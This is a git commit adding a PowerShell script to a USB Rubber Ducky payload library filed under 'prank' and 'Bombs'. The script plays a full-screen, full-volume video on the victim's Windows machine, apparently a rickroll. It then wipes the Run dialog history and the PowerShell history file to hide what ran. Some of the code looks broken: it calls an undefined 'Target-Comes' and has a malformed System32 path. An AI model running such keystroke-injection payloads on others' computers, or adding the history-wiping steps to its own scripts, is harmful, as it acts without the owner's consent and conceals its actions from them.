3a768518110684677b246c277d8ca3178a1cdf73
FalsePhilosopher <joshgarland90@gmail.com>
2022-08-12 00:52:32 -0600

    sysforker work

---
+++ Ducky/USBRubberducky/library/prank/Win/Bombs/Sys_Forker/rr/rr.ps1
@@ -0,0 +1,42 @@
+#WPF Library for Playing Movie and some components
+Add-Type -AssemblyName PresentationFramework
+
+Add-Type -AssemblyName System.ComponentModel
+#XAML File of WPF as windows for playing movie
+
+[xml]$XAML = @"
+ 
+<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" >
+        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"  />
+</Window>
+"@
+ 
+#Movie Path
+[uri]$VideoSource = "$env:C:Windows\System32\rr\rr.mp4"
+ 
+#Devide All Objects on XAML
+$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
+$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
+$VideoPlayer = $Window.FindName("VideoPlayer")
+
+ 
+#Video Default Setting
+$VideoPlayer.Volume = 100;
+$VideoPlayer.Source = $VideoSource;
+#$VideoPlayer.Padding = new Thickness(5);
+
+
+Target-Comes
+
+$VideoPlayer.Play()
+ 
+#Show Up the Window 
+$Window.ShowDialog() | out-null
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath
